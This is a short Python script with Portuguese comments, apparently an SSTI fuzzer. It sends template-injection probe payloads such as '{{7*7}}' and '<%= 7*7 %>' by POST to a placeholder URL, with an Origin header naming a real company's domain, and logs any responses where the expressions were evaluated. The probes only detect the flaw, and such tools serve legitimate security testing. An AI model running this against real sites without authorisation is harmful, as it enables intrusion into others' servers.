import requests
import json

URL = "https://seualvoaqui/..."

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; SSTI-Fuzzer/1.0)",
    "Content-Type": "application/json",
    "Origin": "https://collaboration.rei.com",
}

COOKIES = {
    "ak_bmsc": "EXEMPLO-COOKIE-AQUI",
    "akamai_session": "EXEMPLO-SESSION-AQUI",
    "_ga": "GA-ID-EXEMPLO",
}

# Payloads de SSTI para injeção
payloads = [
    "{{7*7}}",
    "{{1337*2}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
]

# Padrão do JSON (ajuste conforme o necessário ou que você viu no Burp)
def build_payload(p):
    return {
        "search": p,  # troque por uma chave real, se identificada
        "user": "fuzz_tester",
        "data": "test"
    }

RESULTS_FILE = "ssti_post_results.txt"

def test_ssti_post():
    print("[*] Enviando payloads via POST...\n")
    found = False

    with open(RESULTS_FILE, "w") as f:
        for p in payloads:
            json_data = build_payload(p)
            try:
                r = requests.post(URL, headers=HEADERS, cookies=COOKIES, json=json_data, timeout=10)

                if r.status_code == 201 and any(str(eval_part) in r.text for eval_part in ["49", "2674", "true"]):
                    msg = f"[+] SSTI possível com payload: {p}\nResposta:\n{r.text}\n\n"
                    print(msg.strip())
                    f.write(msg)
                    found = True
            except Exception as e:
                print(f"[-] Erro com payload {p}: {e}")

    if not found:
        print("[-] Nenhuma SSTI detectada.")
    else:
        print(f"\n[+] Resultados salvos em {RESULTS_FILE}")

if __name__ == "__main__":
    test_ssti_post()
